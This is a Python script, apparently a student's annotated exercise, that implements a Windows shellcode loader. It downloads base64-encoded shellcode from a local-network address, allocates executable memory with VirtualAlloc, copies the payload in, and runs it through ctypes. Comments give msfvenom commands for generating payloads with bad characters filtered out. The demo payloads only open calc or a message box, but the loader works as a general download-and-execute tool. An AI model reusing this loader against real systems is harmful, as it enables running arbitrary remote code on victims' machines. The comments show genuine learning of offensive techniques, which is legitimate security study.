from urllib import request

import base64
import ctypes

#? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:

#! WORKS WITH CRASH

#! msfvenom -p windows/x64/messagebox TEXT="Test Msg" TITLE="Test Title" -b '\x00' '\x0A' '\x0D' '\xFF' '\x20' EXITFUNC=thread -o msg.raw
#! base64 -w 0 -i msg.raw > msg.bin

#! msfvenom -p windows/x64/exec -f raw cmd=calc.exe -b '\x00' '\x0A' '\x0D' '\xFF' '\x20' EXITFUNC=thread -o calc.raw
#! base64 -w 0 -i calc.raw > calc.bin

URL = 'http://192.168.1.145/calc.bin'
# URL = 'http://192.168.1.145/msg.bin'

#? Not the incorrect example in the f-ing book....

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_memory(buf):
    length = len(buf)
    length = ctypes.c_size_t(length)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    #* https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    #! What is ctype.c_void_p?
    #? https://stackoverflow.com/questions/11626786/what-does-void-mean-and-how-to-use-it
    #? By accepting void *, qsort can work with ... any type.
    #? The disadvantage of using void * is that you throw type safety out the window and into oncoming  
    #? traffic. There's nothing to protect you from using the wrong comparison routine:

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    #* https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
    #* "Copies the contents of a source memory block to a destination memory block, 
    #* and supports overlapping source and destination memory blocks."

    #! What is ctype.c_size_t?
    #? https://www.geeksforgeeks.org/size_t-data-type-c-language/
    #? It’s a type which is used to represent the size of objects in bytes and 
    #? is therefore used as the return type by the sizeof operator. 
    #? It is guaranteed to be big enough to contain the size of the biggest 
    #? object the host system can handle. Basically the maximum permissible 
    #? size is dependent on the compiler; if the compiler is 32 bit then it is 
    #? simply a typedef(i.e., alias) for unsigned int but if the compiler is 64 
    #? bit then it would be a typedef for unsigned long long. 
    #? The size_t data type is never negative.

    ptr = kernel32.VirtualAlloc(
        None,   #? If this parameter is NULL, the system determines where to allocate the region.
        length, #? The size of the region, in bytes
        0x3000, #? The type of memory allocation
        0x40)   #? Memory protection 

    print(ptr)
    
    #! what is 0x3000?
    #! I believe 0X3000 is MEM_COMMIT and MEM_RESERVE in a single call
    #* https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    #* Section: [in] flAllocationType
    #* "To reserve and commit pages in one step, call VirtualAlloc with MEM_COMMIT | MEM_RESERVE.""

    #! what is 0x40?
    #* https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
    #* "The following are the memory-protection options; you must specify one of the following 
    #* values when allocating or protecting a page in memory." 
    #* 0x40 = Enables execute, read-only, or read/write access to the committed region of pages.

    kernel32.RtlMoveMemory(ptr, buf, length)
    #? Adding the definition here again for RtlMoveMemory
    #* https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
    #* "Copies the contents of a source memory block to a destination memory block, 
    #* and supports overlapping source and destination memory blocks."

    return ptr


def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    #* https://docs.python.org/3/library/ctypes.html#ctypes.create_string_buffer
    #* This function creates a mutable character buffer. The returned object is a ctypes array of c_char.
    ptr = write_memory(buffer)
    #? This is returning the memory pointer for when we execute

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    #* https://docs.python.org/3/library/ctypes.html#ctypes.cast
    #! What is ctypes.cast()
    #* This function is similar to the cast operator in C. It returns 
    #* a new instance of type which points to the same memory block as obj. 
    #* type must be a pointer type, and obj must be an object that can be 
    #* interpreted as a pointer.
    #! What is ctypes.CFUNCTYPE()
    #* https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE
    #* The returned function prototype creates functions that use the standard C calling convention. 
    #? With the CFUNCTYPE(None) option set, we're establishing that there will be no
    #? response when this function is called.

    #! Creating a function with a memory pointer and establishing 
    #! there will be no return value 

    shell_func()


if __name__ == '__main__':
    url = URL
    shellcode = get_code(URL)
    print(shellcode)

    try:
        run(shellcode)
        # exe_shell = threading.Thread(target=run, args=(shellcode,))
        # exe_shell.run()
    except Exception as e:
        print(f'Will Python crash?  {e}')
    #? the run function will call write_memory 